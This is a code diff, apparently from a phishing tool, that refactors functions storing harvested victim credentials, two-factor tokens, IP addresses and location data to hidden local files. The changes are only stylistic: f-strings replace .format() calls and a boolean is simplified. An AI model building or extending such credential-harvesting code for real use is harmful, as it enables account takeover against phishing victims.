@@ -25,18 +25,10 @@ def store_creds(
     try:
         with open('.sniped','a') as fh:
             cred_id = str(uuid.uuid4())
-            fh.write('{},{},{},{},{},{},{},{},{},{}\n'.format(
-                cred_id,
-                module,
-                user,
-                password,
-                two_factor_token,
-                two_factor_type,
-                remote_addr,
-                city,
-                region,
-                zip_code
-            ))
+            fh.write(
+                f'{cred_id},{module},{user},{password},{two_factor_token},{two_factor_type},{remote_addr},{city},{region},{zip_code}\n'
+            )
+
     except Exception as ex:
         output.exception(ex)
 
@@ -45,7 +37,7 @@ def cache_creds(module, username, password):
     try:
         with open('.cache','a+') as fh:
             if username and password:
-                fh.write('{},{},{}\n'.format(module, username, password))
+                fh.write(f'{module},{username},{password}\n')
     except Exception as ex:
         output.exception(ex)
 
@@ -75,12 +67,13 @@ def reload_creds(seen):
                         'password': password,
                         'two_factor_token': two_factor_token,
                         'two_factor_type': two_factor_type,
-                        'seen': True if cred_id in seen else False,
+                        'seen': cred_id in seen,
                         'ip_address': ip_address,
                         'city': city,
                         'region': region,
-                        'zip_code': zip_code
+                        'zip_code': zip_code,
                     }
+
                     creds['creds'].append(add_cred)
     except Exception as ex:
         output.exception(ex)
